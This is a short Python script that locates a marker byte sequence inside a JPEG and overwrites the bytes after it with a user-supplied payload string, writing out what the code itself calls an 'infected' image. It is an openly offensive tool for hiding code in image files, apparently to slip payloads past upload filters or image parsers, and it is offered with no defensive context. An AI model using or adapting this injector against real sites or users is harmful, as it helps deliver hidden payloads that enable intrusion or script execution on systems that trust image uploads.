#!/usr/bin/python3
import sys
import binascii
import os

MAGIC_NUMBER = "03010002110311003f00"
BIN_MAGIC_NUMBER = binascii.unhexlify(MAGIC_NUMBER)

def main():
    path_to_vector_image = sys.argv[1]
    payload_code = sys.argv[2]
    path_to_output = sys.argv[3]

    with open(path_to_vector_image, 'rb') as vector_file:
        bin_vector_data = vector_file.read()

        print("[ ] Searching for magic number...")
        magic_number_index = find_magic_number_index(bin_vector_data)

        if magic_number_index >=0:
            print("[+] Found magic number.")
            with open(path_to_output, 'wb') as infected_file:
                print("[ ] Injecting payload...")
                infected_file.write(
                    inject_payload(
                        bin_vector_data,
                        magic_number_index,
                        payload_code))
                print("[+] Payload written.")
        else:
            print("[-] Magic number not found. Exiting.")

def find_magic_number_index(
        data: bytes) -> int:
    return data.find(BIN_MAGIC_NUMBER)

def inject_payload(
        vector: bytes,
        index: int,
        payload: str) -> bytes:

    bin_payload = payload.encode()

    pre_payload = vector[:index + len(BIN_MAGIC_NUMBER)]
    post_payload = vector[index + len(BIN_MAGIC_NUMBER) + len(bin_payload):]

    return (pre_payload + bin_payload + post_payload)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("USAGE: <jpeg file path> <payload code> <output path>")
    else:
        main()
